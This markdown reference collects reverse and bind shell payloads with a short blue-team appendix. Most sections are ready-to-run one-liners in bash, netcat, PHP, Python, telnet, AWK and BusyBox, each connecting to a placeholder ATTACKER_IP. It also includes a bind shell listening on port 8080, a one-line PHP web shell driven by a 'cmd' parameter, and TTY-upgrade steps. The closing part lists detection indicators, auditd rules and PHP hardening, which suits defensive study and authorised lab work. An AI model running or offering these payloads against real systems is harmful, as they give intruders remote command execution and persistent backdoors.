# Reverse & Bind Shells – Detailed Technical Reference

> ⚠️ **Disclaimer**: This document is intended **strictly for educational, defensive security, and authorized penetration-testing purposes** (e.g., labs such as TryHackMe, Hack The Box, internal red-team engagements with written permission). Unauthorized use against systems you do not own or have permission to test is illegal.

---

## Table of Contents

1. Overview
2. Reverse Shells vs Bind Shells
3. Pipe-Based Reverse Shell (mkfifo)
4. Bind Shell Using Named Pipes
5. Improving Shell Usability

   * rlwrap
6. Netcat Variants

   * nc
   * ncat (Nmap)
7. Socat
8. Bash Reverse Shell Techniques
9. PHP Reverse Shells
10. Python Reverse Shells
11. Other Reverse Shell Techniques

* Telnet
* AWK
* BusyBox

12. Example PHP Web Shell
13. Detection & Defensive Notes

---

## 1. Overview

A **shell** provides an interface to interact with an operating system. In offensive security, shells are commonly used to gain remote command execution after exploiting a vulnerability.

Two common types:

* **Reverse Shell** – Target connects back to the attacker
* **Bind Shell** – Target listens; attacker connects in

---

## 2. Reverse Shells vs Bind Shells

| Feature              | Reverse Shell           | Bind Shell        |
| -------------------- | ----------------------- | ----------------- |
| Connection direction | Target → Attacker       | Attacker → Target |
| Firewall friendly    | ✅ Yes                   | ❌ Often blocked   |
| NAT traversal        | ✅ Easier                | ❌ Harder          |
| Common usage         | Most real-world attacks | Less common       |

---

## 3. Pipe-Based Reverse Shell (mkfifo)

### Payload

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```

### Step-by-Step Breakdown

* `rm -f /tmp/f`

  * Removes any existing FIFO file to avoid conflicts.

* `mkfifo /tmp/f`

  * Creates a **named pipe (FIFO)** for bidirectional communication.

* `cat /tmp/f`

  * Reads input from the pipe and waits for commands.

* `| sh -i 2>&1`

  * Pipes input into an **interactive shell**.
  * `2>&1` merges standard error with standard output.

* `| nc ATTACKER_IP ATTACKER_PORT`

  * Sends shell output to the attacker over TCP.

* `>/tmp/f`

  * Feeds attacker input back into the pipe.

✅ Result: A **fully interactive reverse shell**.

---

## 4. Bind Shell Using Named Pipes

### Payload (Run on Target)

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

### Explanation

* `nc -l 0.0.0.0 8080`

  * Netcat listens on **all interfaces** at port `8080`.

* When an attacker connects, they gain shell access.

⚠️ **Risk**: Firewalls often block inbound connections.

---

## 5. Improving Shell Usability

### rlwrap

`rlwrap` enhances shells by adding:

* Command history
* Arrow-key navigation
* Line editing

#### Example (Attacker Side)

```bash
rlwrap nc -lvnp 443
```

---

## 6. Netcat Variants

### Traditional Netcat (nc)

```bash
nc -lvnp 4444
```

Limitations:

* No encryption
* Inconsistent features across systems

---

### Ncat (Nmap Project)

#### Basic Listener

```bash
ncat -lvnp 4444
```

#### SSL-Encrypted Listener

```bash
ncat --ssl -lvnp 4444
```

Benefits:

* Built-in SSL/TLS
* More stable
* Better error handling

---

## 7. Socat

`socat` is a powerful data relay tool.

### Listener Example

```bash
socat -d -d TCP-LISTEN:443 STDOUT
```

* `-d -d` increases verbosity
* Supports encryption, PTYs, and advanced forwarding

---

## 8. Bash Reverse Shell Techniques

### Standard Bash Reverse Shell

```bash
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```

---

### Read-Line Bash Reverse Shell

```bash
exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done
```

---

### File Descriptor 196

```bash
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196
```

---

### File Descriptor 5

```bash
bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
```

---

## 9. PHP Reverse Shells

### Using exec()

```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
```

### Using shell_exec()

```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
```

### Using system()

```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'
```

### Using passthru()

```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
```

### Using popen()

```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'
```

---

## 10. Python Reverse Shells

> Use `python -c` or `python3 -c`

### Environment Variable Method

```bash
export RHOST="ATTACKER_IP"; export RPORT=443;
python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
```

---

### subprocess Method

```bash
python -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
```

---

### Short Python Reverse Shell

```bash
python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("bash")'
```

---

## 11. Other Reverse Shell Techniques

### Telnet

```bash
TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF | sh 1>$TF
```

---

### AWK

```bash
awk 'BEGIN {s="/inet/tcp/0/ATTACKER_IP/443"; while(1){ do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c!="exit") close(s); }}' /dev/null
```

---

### BusyBox

```bash
busybox nc ATTACKER_IP 443 -e sh
```

---

## 12. Example PHP Web Shell

```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

* Executes OS commands passed via `?cmd=`
* Commonly used after file upload vulnerabilities

---

## 13. Shell Stabilization & TTY Upgrade Techniques

Low-level reverse shells are often unstable: no tab completion, broken Ctrl+C, no job control. The following steps convert a basic shell into a **fully interactive TTY**.

---

### 13.1 Python PTY Upgrade (Recommended)

**On the target shell:**

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

or (Python3):

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

This spawns a pseudo-terminal (PTY), enabling job control and proper terminal behavior.

---

### 13.2 Background & Terminal Fix (stty)

**Step-by-step (attacker side):**

1. Background the shell

```text
Ctrl + Z
```

2. Fix terminal settings

```bash
stty raw -echo; fg
```

3. Press Enter once

✅ Result: Arrow keys, Ctrl+C, Ctrl+Z now work correctly.

---

### 13.3 Using `script` for TTY Upgrade

If Python is unavailable:

```bash
script /dev/null -c bash
```

* Forces allocation of a pseudo-terminal
* Works on many minimal Linux systems

---

### 13.4 Full Interactive Upgrade Workflow (Best Practice)

**Target machine:**

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**Background shell:**

```text
Ctrl + Z
```

**Attacker machine:**

```bash
stty raw -echo; fg
reset
export TERM=xterm
stty rows 40 columns 120
```

🎯 You now have a near-native SSH-like shell.

---

## 14. Blue-Team / Defensive Detection & Mitigation

Understanding how shells are detected is critical for defenders and red-teamers alike.

---

### 14.1 SOC & SIEM Indicators

**Network Indicators:**

* Unexpected outbound connections (especially to ports 443, 4444, 9001)
* Long-lived TCP sessions with low data volume
* Connections to known VPS or residential IPs

**Process Indicators:**

* `bash`, `sh`, `python`, `php` spawning network connections
* Parent-child anomalies (e.g., `nginx → sh`)

**Command-Line Indicators:**

* `/dev/tcp/`
* `mkfifo`, `nc`, `socat`
* `pty.spawn()`

---

### 14.2 EDR / Endpoint Detection

EDR solutions may flag:

* Unsigned binaries opening sockets
* Living-off-the-land binaries (LOLbins)
* Suspicious process trees

**Example suspicious chain:**

```text
apache2 → php → sh → nc
```

---

### 14.3 Linux auditd Detection Rules

Monitor execution of common reverse-shell tools:

```bash
-a always,exit -F arch=b64 -S execve -F exe=/usr/bin/nc -k reverse_shell
-a always,exit -F arch=b64 -S execve -F exe=/usr/bin/socat -k reverse_shell
-a always,exit -F arch=b64 -S execve -F exe=/usr/bin/bash -k bash_exec
```

View alerts:

```bash
ausearch -k reverse_shell
```

---

### 14.4 Web Server & PHP Hardening

**Disable dangerous PHP functions:**

```ini
disable_functions = exec,system,shell_exec,passthru,popen
```

**Additional Controls:**

* Enable `open_basedir`
* Restrict file uploads by MIME and extension
* Use WAF rules to block `cmd=` patterns

---

### 14.5 Network-Level Mitigations

* Egress filtering (block unknown outbound traffic)
* IDS/IPS signatures for Netcat and reverse shells
* TLS inspection for encrypted shells

---

## End of Document

✅ This markdown file is suitable for **study notes, lab documentation, or blue/red team reference**.
